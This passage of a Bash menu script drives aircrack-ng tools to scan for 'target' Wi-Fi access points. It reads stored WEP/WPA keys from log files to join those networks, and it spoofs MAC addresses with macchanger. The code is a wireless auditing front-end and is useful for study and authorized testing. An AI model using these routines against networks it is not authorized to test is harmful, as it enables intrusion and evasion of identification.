			echo "---> Returning to Main Menu..."
			sleep 1
				Main-Menu
		elif [ "$CIPHER" = "$CIPHER" ]; then
			$CIPHER
		else
			echo "ERROR!"
			echo "Error in CIPHER Variable!"
			echo "-=-=-=-=-=-=-=-=-=-=-=-=-"
			echo "Variable CIPHER = $CIPHER"
			echo
			echo "Press Enter to return to Main Menu."
			read ENTER
				Main-Menu
		fi
	else
		echo
		echo "Invalid Selection!"
		sleep 1
			apselect
	fi
}

					# End Access Point Select Function --->

					# <---Start Connect to AP in Logs Menu Function

function selectfromlogs {
clear
cat ./headers/selectfromlogsheader
cat ./headers/line1
	echo
	echo "---> List or Search the Database?"
	echo "---> [(L)ist/(S)earch]"
	read Q
	if [ "$Q" = "l" ]; then
		listapdatabase
	elif [ "$Q" = "s" ]; then
		searchapdatabase
	elif [ "$Q" = "quit" ]; then
		Main-Menu
	else
		echo "Invalid Selection!"
		sleep 1
			selectfromlogs
	fi
}

					# End Connect to AP in Logs Menu Function--->

					# <---Start List APs in Database Function

function listapdatabase {
clear
cat ./headers/listapdatabaseheader
cat ./headers/line1
	echo
	echo "---> Searching..."
	sleep 2
	if [ "$ENC" = "WEP" ]; then
		LOG=$(cat ./logs/WEPIDS.log)
		COUNT=$(cat ./logs/WEPIDS.log |wc -l)
	elif [ "$ENC" = "WPA" ]; then
		LOG=$(cat ./logs/WPAIDS.log |sort -u)
		COUNT=$(cat ./logs/WPAIDS.log |wc -l)
	fi
	if [ "$LOG" = "$(cat /dev/null)" ]; then
		echo "---> NO $ENC APs Found in Database!"
		sleep 1
		echo "---> Returning to Connect Menu..."
		sleep 1
			Connect
	else
		echo "NULL" > /dev/null
	fi
	echo "---> Found $COUNT $ENC Access Points in Database!"
	echo
 OPTIONS="$LOG Previous-Menu Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "---> Returning to Previous Menu..."
			sleep 2
				selectfromlogs
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			AP=$opt
				specificssearch
		else
			echo "Invalid Selection!"
			echo "Try Again!"
			sleep 1
				listapdatabase
		fi
	done
}

					# End List APs in Database Function--->

					# <---Start Access Point Specifics Search

function specificssearch {
	echo
	echo "---> Accessing $ENC Logs..."
	sleep 1
	echo "---> Searching for $AP Connection Properties..."
	sleep 1
	if [ "$ENC" = "WEP" ]; then
		cat ./logs/WEPc.log ./logs/WEPnc.log |grep $AP -A 9 > ./tmp/tmptargetap
	elif [ "$ENC" = "WPA" ]; then
		cat ./logs/WPAc.log ./logs/WPAnc.log |grep $AP -A 8 > ./tmp/tmptargetap
	fi
	if [ "$(cat ./tmp/tmptargetap)" = "$(cat /dev/null)" ]; then
		echo "---> $AP NOT FOUND!"
		echo "---> Returning to Connect Menu..."
		sleep 1
			Connect
	else
		echo "---> $AP FOUND!"
	fi
	echo "---> Extracting Access Point Parameters..."
	sleep 1
	for TYPES in $(cat ./config/connectspecs); do
		export C$TYPES=$(cat ./tmp/tmptargetap |grep $TYPES |cut -d" " -f2 |sort -u)
	done
	if [ "$ENC" = "WPA" ]; then
		export CCIPHER=$(cat ./tmp/tmptargetap |grep Cipher |cut -d" " -f2)
	else
		echo "NULL" > /dev/null
	fi
	if [ "$(echo $CBSSID |cut -d":" -f4,5,6)" = "$(echo "$AP" |cut -d":" -f2,3,4)" ]; then
		echo "---> Extraction Successful!"
		sleep 1
		if [ "$ENC" = "WEP" ]; then
			FROM=DATABASE
			wepconnect
		elif [ "$ENC" = "WPA" ]; then
			FROM=LOGS
			CIPHER=$CCIPHER
				$CCIPHER
		fi
	else
		echo "---> Extraction Failed!"
		sleep 1
		echo "---> Returning to Connect Menu..."
		sleep 1
			Connect
	fi
}
	

					# <---Start WPA-TKIP-PSK Config and Connect Function

function WPA-TKIP-PSK {
	sleep 1
	if [ "$FROM" = "LOGS" ]; then
		LOCALCHANNEL=$CChannel
		LOCALESSID=$CESSID
		KEY=$CKey
	else
		LOCALCHANNEL=$TCH
		LOCALESSID=$TESSID
	fi
	echo "---> Bringing Interface Down..."
	ifconfig $INT down
	echo "---> Setting Channel..."
	iwconfig $INT channel $LOCALCHANNEL
	echo "---> Writing Supplicant File..."
	echo "" > ./tmp/wpa_supplicant.conf
	cat $(echo ./config/wpaconfig/WPA-TKIP-PSK) > ./tmp/wpa_supplicant.conf
	echo 'ssid="'$LOCALESSID'"' >> ./tmp/wpa_supplicant.conf
	echo 'proto=WPA' >> ./tmp/wpa_supplicant.conf
	echo 'key_mgmt=WPA-PSK' >> ./tmp/wpa_supplicant.conf
	echo 'pairwise=TKIP' >> ./tmp/wpa_supplicant.conf
	echo 'group=TKIP' >> ./tmp/wpa_supplicant.conf
	echo 'psk="'$KEY'"' >> ./tmp/wpa_supplicant.conf
	echo "}" >> ./tmp/wpa_supplicant.conf
	echo "---> Supplicant File Written!"
	echo "---> Bringing Interface Up..."
	echo "---> Initalizing Key Negotiation..."
	wpa_supplicant -Dwext -i$INT -c./tmp/wpa_supplicant.conf -P /tmp/wpa_supplicant.$INT.pid -B
	sleep 8
	echo "---> Key Negotiation Complete!"
	echo "---> Connecting..."
		dhclient -pf /tmp/dhclient.$INT.pid -lf /tmp/dhclient.$INT.leases $INT
	echo
	echo "---> Would you like to run network tests?"
	echo "---> [y/n]"
	read Q
	echo
	if [ "$Q" = "y" ]; then
			connecttest
	elif [ "$Q" = "n" ]; then
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	else
		echo "Invalid Selection!"
	fi
}
					# End WPA-TKIP-PSK Config and Connect Function --->

					# <---Start WPA-CCMP&TKIP-PSK Config and Connect Function
function WPA-CCMP-PSK {
	sleep 1
	if [ "$FROM" = "LOGS" ]; then
		LOCALCHANNEL=$CChannel
		LOCALESSID=$CESSID
		KEY=$CKey
	else
		LOCALCHANNEL=$TCH
		LOCALESSID=$TESSID
	fi
	echo "---> Bringing Interface Down..."
	ifconfig $INT down
	echo "---> Setting Channel..."
	iwconfig $INT channel $LOCALCHANNEL
	echo "---> Writing Supplicant File..."
	sleep 2
	echo "" > ./tmp/wpa_supplicant.conf
	cat ./config/wpaconfig/WPA-CCMP-PSK > ./tmp/wpa_supplicant.conf
	echo 'ssid="'$LOCALESSID'"' >> ./tmp/wpa_supplicant.conf
	echo 'key_mgmt=WPA-PSK' >> ./tmp/wpa_supplicant.conf
	echo 'proto=WPA' >> ./tmp/wpa_supplicant.conf
	echo 'pairwise=CCMP TKIP' >> ./tmp/wpa_supplicant.conf
	echo 'group=CCMP TKIP' >> ./tmp/wpa_supplicant.conf
	echo 'psk="'$KEY'"' >> ./tmp/wpa_supplicant.conf
	echo "}" >> ./tmp/wpa_supplicant.conf
	echo "---> Supplicant File Written!"
	echo "---> Bringing Interface Up..."
	sleep 1
	echo "---> Initalizing Key Negotiation..."
        wpa_supplicant -Dwext -i$INT -c./tmp/wpa_supplicant.conf -P /tmp/wpa_supplicant.$INT.pid -B
	sleep 8
	echo "---> Key Negotiation Complete!"
	echo "---> Connecting..."
		dhclient  -pf /tmp/dhclient.$INT.pid -lf /tmp/dhclient.$INT.leases $INT
	echo
	echo "---> Would you like to run network tests?"
	read Q
	echo
	if [ "$Q" = "y" ]; then
			connecttest
	elif [ "$Q" = "n" ]; then
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	else
		echo "Invalid Selection!"
	fi
}
					# End WPA-CCMP&TKIP-PSK Config and Connect Function --->

					# <---Start WPA2-CCMP-PSK Config and Connect Function
function WPA2-CCMP-PSK {
	sleep 1
	if [ "$FROM" = "LOGS" ]; then
		LOCALCHANNEL=$CChannel
		LOCALESSID=$CESSID
		KEY=$CKey
	else
		LOCALCHANNEL=$TCH
		LOCALESSID=$TESSID
	fi
	echo "---> Bringing Interface Down..."
	ifconfig $INT down
	echo "---> Setting Channel..."
	iwconfig $INT channel $LOCALCHANNEL
	echo "---> Writing Supplicant File..."
	sleep 2
	echo "" > ./tmp/wpa_supplicant.conf
	cat ./config/wpaconfig/WPA2-CCMP-PSK > ./tmp/wpa_supplicant.conf
	echo 'ssid="'$LOCALESSID'"' >> ./tmp/wpa_supplicant.conf
	echo 'proto=RSN' >> ./tmp/wpa_supplicant.conf
	echo 'key_mgmt=WPA-PSK' >> ./tmp/wpa_supplicant.conf
	echo 'pairwise=CCMP' >> ./tmp/wpa_supplicant.conf
	echo 'group=CCMP' >> ./tmp/wpa_supplicant.conf
	echo 'psk="'$KEY'"' >> ./tmp/wpa_supplicant.conf
	echo "}" >> ./tmp/wpa_supplicant.conf
	echo "---> Supplicant File Written!"
	echo "---> Bringing Interface Up..."
	sleep 1
	echo "---> Initalizing Key Negotiation..."
        wpa_supplicant -Dwext -i$INT -c./tmp/wpa_supplicant.conf -P /tmp/wpa_supplicant.$INT.pid -B
	sleep 8
	echo "---> Key Negotiation Complete!"
	echo "---> Connecting..."
		dhclient -pf /tmp/dhclient.$INT.pid -lf /tmp/dhclient.$INT.leases $INT
	echo
	echo "---> Would you like to run network tests?"
	read Q
	echo
	if [ "$Q" = "y" ]; then
			clear
			connecttest
	elif [ "$Q" = "n" ]; then
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	else
		echo "Invalid Selection!"
	fi
}

					# End WPA2-CCMP-PSK Config and Connect Function --->

					# <---Start WPA2-TKIP-PSK Config and Connect Function

function WPA2-TKIP-PSK {
	sleep 1
	if [ "$FROM" = "LOGS" ]; then
		LOCALCHANNEL=$CChannel
		LOCALESSID=$CESSID
		KEY=$CKey
	else
		LOCALCHANNEL=$TCH
		LOCALESSID=$TESSID
	fi
	echo "---> Bringing Interface Down..."
	ifconfig $INT down
	echo "---> Setting Channel..."
	iwconfig $INT channel $LOCALCHANNEL
	echo "---> Writing Supplicant File..."
	sleep 2
	echo "" > ./tmp/wpa_supplicant.conf
	cat ./config/wpaconfig/WPA2-TKIP-PSK > ./tmp/wpa_supplicant.conf
	echo 'ssid="'$LOCALESSID'"' >> ./tmp/wpa_supplicant.conf
	echo 'proto=RSN' >> ./tmp/wpa_supplicant.conf
	echo 'key_mgmt=WPA-PSK' >> ./tmp/wpa_supplicant.conf
	echo 'pairwise=CCMP TKIP' >> ./tmp/wpa_supplicant.conf
	echo 'group=CCMP TKIP' >> ./tmp/wpa_supplicant.conf
	echo 'psk="'$KEY'"' >> ./tmp/wpa_supplicant.conf
	echo "}" >> ./tmp/wpa_supplicant.conf
	echo "---> Supplicant File Written!"
	echo "---> Bringing Interface Up..."
	sleep 1
	echo "---> Initalizing Key Negotiation..."
        wpa_supplicant -Dwext -i$INT -c./tmp/wpa_supplicant.conf -P /tmp/wpa_supplicant.$INT.pid -B
	sleep 8
	echo "---> Key Negotiation Complete!"
	echo "---> Connecting..."
		dhclient -pf /tmp/dhclient.$INT.pid -lf /tmp/dhclient.$INT.leases $INT
	echo
	echo "---> Would you like to run network tests?"
	echo "---> [y/n]"
	read Q
	echo
	if [ "$Q" = "y" ]; then
			connecttest
	elif [ "$Q" = "n" ]; then
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	else
		echo "Invalid Selection!"
	fi
}
					# End WPA2-TKIP-PSK Config and Connect Function --->

					# <---Start Network Connectivity Test Function

function connecttest {
	echo
	echo "---> Testing Connection..."
	sleep 1
	export CURRENTIP=$(ifconfig $INT |grep inet |cut -d" " -f 12 |cut -d":" -f 2)
	if [ "$CURRENTIP" = "$(cat /dev/null)" ]; then
		echo "---> NO IP ADDRESS!"
		echo 
		echo "---> Press Enter to Return to Main Menu."
		read ENTER
		if [ "$ENTER" = "$(cat /dev/null)" ]; then
			echo "---> Returning to Main Menu..."
				Main-Menu
		elif [ "$ENTER" = "quit" ]; then
			echo "NULL" > /dev/null
		fi
	else
		echo "NULL" > /dev/null 
	fi
	export IPBASE=$(echo $CURRENTIP |cut -d"." -f1-3)
	echo "--------------------------"
	echo "IP Address: $CURRENTIP"
	echo "IP Base: $IPBASE"
	echo "--------------------------"
	sleep 1
	echo "---> Testing Local LAN..."
	echo "---> Checking Potential Gateway..."
	echo "---> $IPBASE.1 - TESTING..."
	sleep 1
	ping -c 2 $IPBASE.1 > ./tmp/pingresults
	ALIVE=$(cat ./tmp/pingresults |grep 'bytes from')
	if [ "$ALIVE" = "$(cat /dev/null)" ]; then
		echo "---> No Response!"
		GW1=DOWN
	else
		echo "---> Response Received!"
		GW1=UP
	fi
	echo "---> $IPBASE.254 - TESTING..."
	sleep 1
	ping -c 2 $IPBASE.254 > ./tmp/pingresults
	ALIVE=$(cat ./tmp/pingresults |grep 'bytes from')
	if [ "$ALIVE" = "$(cat /dev/null)" ]; then
		echo "---> No Response!"
		GW2=DOWN
	else
		echo "---> Response Received!"
		GW2=UP
	fi
	echo "---> LAN Test Complete!"
	echo "---> Testing WAN..."
	ping -c 2 google.com > ./tmp/pingresults
	NET=$(cat ./tmp/pingresults |grep 'bytes from')
	if [ "$NET" = "$(cat /dev/null)" ]; then
		echo "---> No Response!"
		INET=DOWN
	else
		echo "---> Response Received!"
		INET=UP
	fi
	echo "---> Testing Complete!"
	echo
	echo "--------> STATUS <---------"
	echo "IP ADDRESS:-$CURRENTIP"
	echo "IP BASE:----$IPBASE"
	echo "Gateway L:--$GW1"
	echo "Gateway H:--$GW2"
	echo "Internet:---$INET" 
	echo "---------------------------"
	echo
	echo "---> Press Enter to Return to Main Menu."
	read ENTER
	echo "---> Returning to Main Menu..."
		Main-Menu
}

					# End Network Connectivity Test Function --->

					# <---Start WEP Connection Function

function wepconnect {
clear
cat ./headers/wepconnectheader
cat ./headers/line1
	if [ "$CKey" = "$(cat /dev/null)" ]; then
		if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
			echo
			echo "---> Please Enter Encryption Key, <---"
			echo "---> or leave blank for OPEN Network. <---"
			echo "--------------------------------------"
			read KEY
			echo "--------------------------------------"
			if [ "$KEY" = "$(cat /dev/null)" ]; then
				echo
				echo "---> No Encryption Code Set!"
				sleep 1
				echo "---> Assuming OPEN System!"
			elif [ "$KEY" = "$KEY" ]; then
				echo
				echo "---> Key Set: $KEY"
			fi
		else
			KEY=$TENCCODE
		fi
	else
		KEY=$CKey
	fi
	echo
	echo "---> Initalizing..."
	sleep 1
	echo "---> Brining Interface Down..."
	sleep 1
	ifconfig $INT down
	echo "---> Configuring Interface..."
	sleep 2
	if [ "$FROM" = "$(cat /dev/null)" ]; then
		LOCALAP=$TBSSID
		LOCALESSID=$TESSID
		LOCALCHANNEL=$TCH
	elif [ "$FROM" = "DATABASE" ]; then
		LOCALAP=$CBSSID
		LOCALESSID=$CESSID
		LOCALCHANNEL=$CChannel
	fi
	iwconfig $INT ap $LOCALAP
	iwconfig $INT essid $LOCALESSID
	iwconfig $INT channel $LOCALCHANNEL
	if [ "$KEY" = "$(cat /dev/null)" ]; then
		echo "NULL" > /dev/null
	elif [ "$(echo $KEY |wc -m)" -gt "15" ]; then
		iwconfig $INT enc $KEY
	else
		iwconfig $INT enc s:$KEY
	fi
	echo "---> Interface Configured!"
	sleep 1
	echo "---> Brining Interface Up..."
	ifconfig $INT up
	sleep 1
	echo "---> Connecting..."
	dhclient -pf ./tmp/dhclient.$INT.pid -lf ./tmp/dhclient.$INT.leases $INT
	echo
	echo "---> Connected!"
	echo
	echo "---> Would you like to run Network Tests?"
	read Q
	if [ "$Q" = "y" ]; then
		connecttest
	elif [ "$Q" = "n" ]; then
		echo
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	else
		echo "Invalid Selection!"
	fi
	
}
					
					# <---Start Change Media Access Controller Address Return Function

function MAC-Options {
	export PARENT=MAC
		Interface-Status-Check
}

					# End Change Media Access Controller Address Return Function --->

					# <---Start MAC Options Menu Function
function macmenu {
clear
cat ./headers/macmenuheader
cat ./headers/line1
echo
 OPTIONS="Change View Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo
			echo "Returning to Main Menu..."
			sleep 1
					Main-Menu
		elif [ "$opt" = "Change" ]; then
					changemac
		elif [ "$opt" = "View" ]; then
					viewmac
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End MAC Options Menu Function --->

					# <---Start View Media Access Controller Adddress's Function

function viewmac {
clear
cat ./headers/viewmacheader
cat ./headers/line1
	sleep 1
	if [ "$(cat ./tmp/monitoringinterfaces | wc -l)" -gt "0" ]; then
		for INT in $(cat ./tmp/monitoringinterfaces); do
			echo "Monitoring Interface $INT Detected!"
			sleep 1
			macchanger -s $INT
			echo
		done
	else
		echo "NULL" > /dev/null
	fi
	if [ "$(cat ./tmp/managedinterfaces | wc -l)" -gt "0" ]; then
		for INT in $(cat ./tmp/managedinterfaces); do
			echo "Managed Interface $INT Detected!"
			sleep 1
			macchanger -s $INT
			echo
		done
	else
		echo "NULL" > /dev/null
	fi
	if [ "$(cat ./tmp/parentinterfaces | wc -l)" -gt "0" ]; then
		for INT in $(cat ./tmp/parentinterfaces); do
			echo "Parent Interface $INT Detected!"
			sleep 1
			macchanger -s $INT
			echo
		done
	else
		echo "NULL" > /dev/null
	fi
	echo "Press Enter to Return to Main Menu."
	read ENTER
	echo "Returning to Main Menu..."
	sleep 1
			Main-Menu
}		



					# <--- Start Media Access Controller Address Changer Function

function changemac {
cat ./tmp/monitoringinterfaces ./tmp/managedinterfaces ./tmp/parentinterfaces |sort -u > ./tmp/allinterfaces
clear
cat ./headers/changemacheader
cat ./headers/line1
echo "Which Interfaces' Media Access Controller Address would you like to change?"
 OPTIONS="$(cat ./tmp/allinterfaces) Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo "Returning to Main Menu..."
					Main-Menu
		elif [ "$opt" = "$opt" ]; then
			INT=$opt
			echo
			echo "Interface to be Changed: $INT"
			echo
			echo "How would you like to determine the new MAC Address?"
			 OPTIONS="Manual-Set Semi-Random Fully-Random Main-Menu"
				select opt in $OPTIONS; do
					if [ "$opt" = "Main-Menu" ]; then
						echo "Returning to Main Menu..."
						sleep 1
								Main-Menu
					elif [ "$opt" = "Manual-Set" ]; then
						echo "Please Enter New MAC Address"
						echo "00:11:22:33:44:55"
						read NEWMAC
						echo
						echo "Changing MAC Address..."
						ifconfig $INT down
						sleep 1
						macchanger --mac=$NEWMAC $INT
						echo "MAC Changed Sucessfully!"
						sleep 1
						ifconfig $INT up
						echo "Returning to Main Menu..."
						sleep 2
								Main-Menu
					elif [ "$opt" = "Semi-Random" ]; then
						echo "Setting Random Address of Same Manufacturer..."
						ifconfig $INT down
						sleep 1
						macchanger -a $INT
						echo "MAC Changed Sucessfully!"
						sleep 1
						ifconfig $INT up
						echo "Returning to Main Menu..."
						sleep 2
								Main-Menu
					elif [ "$opt" = "Fully-Random" ]; then
						echo "Setting Random Address of any Manufacturer..."
						ifconfig $INT down
						sleep 1
						macchanger -A $INT
						echo "MAC Changed Sucessfully!"
						sleep 1
						ifconfig $INT up
						echo "Returning to Main Menu..."
						sleep 2
								Main-Menu
					else
						echo "Invalid Selection!"
					fi
				done
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Media Access Controller Address Changer Function --->

					# <---Start Driver Options Menu Function

function Driver-Options {
clear
cat ./headers/driveroptionsmenuheader
cat ./headers/line1
	echo
 OPTIONS="Display Change Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$opt" = "Change" ]; then
			driverchange
		elif [ "$opt" = "$opt" ]; then
			$opt
		else
			echo "Invalid Selection!"
			sleep 1
				Driver-Options
		fi
	done
}

					# End Driver Options Menu Function --->

					# <---Start Driver Display Menu Function

function Display {
clear
cat ./headers/driverdisplaymenuheader
cat ./headers/line1
	echo
	echo "---> What would you like to Display? <---"
 OPTIONS="Supported In-Kernel Installed Loaded Previous-Menu Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "---> Returning to Previous Menu..."
			sleep 2
				Driver-Options
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			$opt
		else
			echo "Invalid Selection!"
			sleep 1
				Display
		fi
	done
}

					# End Driver Display Menu Function --->

					# <---Start Supported Drivers Display Function

function Supported {
clear
cat ./headers/supporteddriverheader
cat ./headers/line1
	echo
	echo "---> Checking..."
	sleep 1
	echo "$(airdriver-ng supported)"
	echo
	echo "---> Display Complete!"
	echo "---> Press Enter to Return to Driver Options Menu."
	read ENTER
	echo "---> Returning to Driver Options Menu..."
	sleep 2
		Driver-Options
}

					# End Supported Drivers Display Function --->

					# <---Start In-Kernel Driver Display Function

function In-Kernel {
clear
cat ./headers/inkerneldriverheader
cat ./headers/line1
	echo
	echo "---> Checking..."
	sleep 1
	echo "$(airdriver-ng kernel)"
	echo
	echo "---> Display Complete!"
	echo "---> Press Enter to Return to Driver Options Menu."
	read ENTER
	echo "---> Returning to Driver Options Menu..."
	sleep 2
		Driver-Options
}

					# End In-Kernel Driver Display Function

					# <---Start Installed Driver Display Function

function Installed {
clear
cat ./headers/installeddriverheader
cat ./headers/line1
	echo
	echo "---> Checking..."
	sleep 1
	echo "$(airdriver-ng installed)"
        echo
        echo "---> Display Complete!"
        echo "---> Press Enter to Return to Driver Options Menu."
        read ENTER 
	echo "---> Returning to Driver Options Menu..."
	sleep 2
		Driver-Options
}

					# End Installed Driver Display Function --->

					# <---Start Loaded Driver Display Function

function Loaded {
clear
cat ./headers/loadeddriversheader
cat ./headers/line1
	echo
	echo "---> Checking..."
	sleep 1
	echo "$(airdriver-ng loaded)"
	echo
	echo "---> Display Complete!"
	echo "---> Press Enter to Return to Driver Options Menu."
	read ENTER
	echo "---> Returning to Driver Options Menu..."
	sleep 2
		Driver-Options
}

					# End Loaded Drivers Display Function --->

					# <---Start Change Driver Options Menu Function

function driverchange {
clear
cat ./headers/changedrivermenuheader
cat ./headers/line1
	echo
 OPTIONS="Load UnLoad ReLoad Previous-Menu Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "---> Returning to Previous Menu..."
			sleep 2
				Driver-Options
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			$opt
		else
			echo
			echo "Invalid Selection!"
			sleep 1
			driverchange
		fi
	done
}

					# End Change Driver Options Menu Function--->

					# <---Start Load Driver Function

function Load {
clear
cat ./headers/loaddriverheader
cat ./headers/line1
	echo
	echo "---> Checking for Installed Drivers..."
	sleep 1
	echo "$(airdriver-ng installed)"
	echo
	echo "---> Please Enter Driver Number to Load."
	read DRIVERNUM
	if [ "$DRIVERNUM" = "quit" ]; then
		Driver-Options
	else
		echo "NULL" > /dev/null
	fi
	echo "$(airdriver-ng installed)" > ./tmp/installeddrivers
	DESC=$(grep $DRIVERNUM ./tmp/installeddrivers)
	echo "$(airdriver-ng loaded)" > ./tmp/loadeddrivers
	LOADED=$(grep $DRIVERNUM ./tmp/loadeddrivers)
	if [ "$LOADED" = "$(cat /dev/null)" ]; then
		echo
		echo "---> Preparing to Load: $DESC..."
		sleep 1
		echo "---> Loading..."
		sleep 1
		airdriver-ng load $DRIVERNUM
		echo 
		echo "---> Driver Load Complete!"
		echo "---> Press Enter to Return to Driver Options Menu."
		read ENTER
		echo "---> Returning to Driver Options Menu..."
		sleep 2
			Driver-Options
	else
		echo
		echo "---> Driver Appears to already be loaded!"
		echo "---> Please Use the Reload or Unload Functions."
		sleep 3
		echo "---> Returning to Driver Options Menu..."
		sleep 2
			Driver-Options
	fi
}
	
					# End Load Driver Function --->

					# <---Start Driver UnLoad Function

function UnLoad {
clear
cat ./headers/unloaddriverheader
cat ./headers/line1
	echo
	echo "---> Checking for Loaded Drivers..."
	echo "$(airdriver-ng loaded)"
	echo
	echo "---> Please Specifiy Driver Number you with to UnLoad."
	read DRIVERNUM
	if [ "$DRIVERNUM" = "quit" ]; then
		Driver-Options
	else
		echo "NULL" > /dev/null
	fi
	echo
	echo "---> Preparing to Unload Driver $DRIVERNUM..."
	echo "$(airdriver-ng loaded)" > ./tmp/loadeddrivers
	DESC=$(grep $DRIVERNUM ./tmp/loadeddrivers)
	echo "---> UnLoad: $DESC"
	sleep 1
	echo "---> Unloading..."
	sleep 1
	airdriver-ng unload $DRIVERNUM
	echo
	echo "---> Driver $DESC Unloaded!"
	sleep 1
	echo "---> Press Enter to Return to Driver Options."
	read ENTER
	echo "---> Returning to Driver Options..."
	sleep 2
		Driver-Options
}

					# End Driver UnLoad Function --->

					# <---Start Driver ReLoad Function

function ReLoad {
clear
cat ./headers/driverreloadheader
cat ./headers/line1
	echo
	echo "---> Checking for Loaded Drivers..."
	echo "$(airdriver-ng loaded)"
	echo
	echo "---> Please Specify Driver to be ReLoaded."
	read DRIVERNUM
	if [ "$DRIVERNUM" = "quit" ]; then
		Driver-Options
	else
		echo "NULL" > /dev/null
	fi	
	echo "$(airdriver-ng loaded)" > ./tmp/loadeddrivers
	DESC=$(grep $DRIVERNUM ./tmp/loadeddrivers)
	echo
	echo "---> Driver: $DESC"
	echo "---> Reloading..."
	airdriver-ng reload $DRIVERNUM
	echo
	echo "---> ReLoad Complete!"
	echo "---> Press Enter to Return to Driver Options."
	read ENTER
	echo "---> Returning to Driver Options..."
	sleep 2
		Driver-Options
}

					# End ReLoad Driver Function --->
		
					# <---Start Wlan Scans Menu
function WIFI-Scans { 
clear 
cat ./headers/wlanscansheader 
cat ./headers/line1 
echo "What type of Scan would you like to initalize?"
 OPTIONS="Kismet FIFO RRobin HOL AP-Specific Reveal-Hidden Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo
			echo "Returning to Main Menu..."
			sleep 1
				Main-Menu
		elif [ "$opt" = "Kismet" ]; then
			echo
			echo "---> Initalizing Kismet Preparation System..."
			export PARENT=KISMET
			sleep 1
				Interface-Status-Check
		elif [ "$opt" = "FIFO" ]; then
			echo
			echo "Filter by Encryption?"
			echo "[WEP/WPA/OPN]"
			read ENCFILTER
			echo
			echo "Encryption Filter set as $ENCFILTER"
			echo
			if [ "$ENCFILTER" = "$(cat /dev/null)" ]; then
				echo
				echo "Initalizing No Filter FIFO Scan..."
				sleep 1
				$(cat ./config/scan.cfg) airodump-ng --band g -s 0 $INT &
					Set
			elif [ "$ENCFILTER" = "$ENCFILTER" ]; then
				echo "Initalizing $ENCFILTER Filtered FIFO Scan..."
				sleep 1
				$(cat ./config/scan.cfg) airodump-ng --band g -s 0 --encrypt $ENCFILTER $INT &
					Set
			fi
		elif [ "$opt" = "RRobin" ]; then
			echo
			echo "Filter by Encryption?"
			echo "[WEP/WPA/OPN]"
			read ENCFILTER
			if [ "$ENCFILTER" = "$(cat /dev/null)" ]; then
				echo
				echo "Initalizing No Filter Round Robin Scan..."
				sleep 1
				$(cat config/scan.cfg) airodump-ng --band g -s 1 $INT &
					Set
			elif [ "$ENCFILTER" = "$ENCFILTER" ]; then
				echo
				echo "Initalizing $ENCFILTER Filtered Round Robin Scan..."
				sleep 1
				$(cat config/scan.cfg) airodump-ng --band g -s 1 --encrypt $ENCFILTER $INT &
					Set
			fi
		elif [ "$opt" = "HOL" ]; then
			echo
			echo "Filter by Encryption?"
			echo "[WEP/WPA/OPN]"
			read ENCFILTER
			if [ "$ENCFILTER" = "$(cat /dev/null)" ]; then
				echo
				echo "Initalizing No Filter Hop on Last Scan..."
				sleep 1
				$(cat config/scan.cfg) airodump-ng --band g -s 2 $INT &
					Set
			elif [ "$ENCFILTER" = "$ENCFILTER" ]; then
				echo
				echo "Initalizing $ENCFILTER Filtered Hop on Last Scan..."
				sleep 1
				$(cat config/scan.cfg) airodump-ng --band g -s 2 --encrypt $ENCFILTER $INT &
					Set
			fi
		elif [ "$opt" = "AP-Specific" ]; then
			echo
			echo "Determining Current Target..."
			sleep 2
			if [ "$TBSSID" = "$(cat /dev/null)" ]; then
				echo
				echo "No Target Set!"
				echo "Please Select a Target First!"
				sleep 1
				echo
				echo "Returning to Wifi Scans..."
				sleep 1
					WIFI-Scans
			else
				if [ "$TESSID" = "$(cat /dev/null)" ]; then
					echo "Target Found: $TBSSID"
					WHO=$TBSSID
					sleep 1
				else
					echo "Target Found: $TESSID"
					echo "MAC: $TBSSID"
					WHO=$TESSID
					sleep 1
				fi
			fi
			AP=$TBSSID
			CH=$TCH
			ENC=$TENC
			if [ "$ENC" = "WEP" ]; then
				export LASTCAP=WEP
			elif [ "$ENC" = "WPA" ]; then
				export LASTCAP=WPA
			else
				echo "NULL" > /dev/null
			fi
			echo
			echo "Initalizing Scan of $WHO..."
			sleep 1
			$(cat config/scan.cfg) airodump-ng --band g --channel $CH --bssid $AP --encrypt $ENC $INT &
			echo
			echo "Loading Target Options..."
					Target-Options
		elif [ "$opt" = "Reveal-Hidden" ]; then
			REVEALHIDDEN
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Wlan Scans Menu --->

					# <---Start Kismet Scan Preparation Function

function preparekismet {
clear
cat ./headers/preparekismetheader
cat ./headers/line1
	echo
	INTS=$(cat ./tmp/monitoringinterfaces |wc -l)
	echo "---> Found $INTS Monitoring Interface(s)!"
	if [ "$INTS" = "0" ]; then
		echo
		echo "---> Please Create a VAP in Monitor Mode!"
		echo "---> Moving to Interface Options..."
		sleep 2
			Interface-Options
	elif [ "$INTS" = "1" ]; then
		if [ "$INT" = "$(cat ./tmp/monitoringinterfaces)" ]; then
			INT=$INT
			export DESTROYALL=FALSE
			echo
